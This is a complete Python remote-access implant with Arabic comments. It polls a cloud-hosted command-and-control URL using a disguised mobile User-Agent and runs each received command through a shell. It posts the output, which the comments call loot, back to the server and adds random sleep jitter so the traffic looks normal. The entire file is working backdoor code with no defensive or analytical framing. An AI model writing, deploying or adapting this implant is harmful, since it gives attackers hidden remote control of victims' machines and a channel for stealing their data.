import time
import random
import requests
import subprocess

# رابط استضافتك السحابية الحقيقية (مثلاً على PythonAnywhere أو Render)
C2_SERVER = "https://your-free-cloud-server.onrender.com/api/v1/sync"
AGENT_ID = "TARGET_SHADOW_01"

def silent_pulse():
    while True:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36",
                "X-Agent-ID": AGENT_ID
            }
            
            # سحب الأوامر من السحاب بصمت
            response = requests.get(C2_SERVER, headers=headers, timeout=10)
            
            if response.status_code == 200 and response.text.strip():
                command = response.text.strip()
                if command and "No orders yet" not in command:
                    output = execute_in_shadows(command)
                    # إرسال الغنائم والنتائج للسيرفر السحابي
                    requests.post(C2_SERVER, json={"result": output}, headers=headers, timeout=10)
                
        except Exception:
            pass
        
        # Jitter عشوائي لتبدو حركة المرور طبيعية تماماً
        time.sleep(random.randint(45, 90))

def execute_in_shadows(cmd):
    try:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        return output.decode('utf-8', errors='ignore').strip()
    except Exception:
        return "Execution Error"

if __name__ == "__main__":
    silent_pulse()

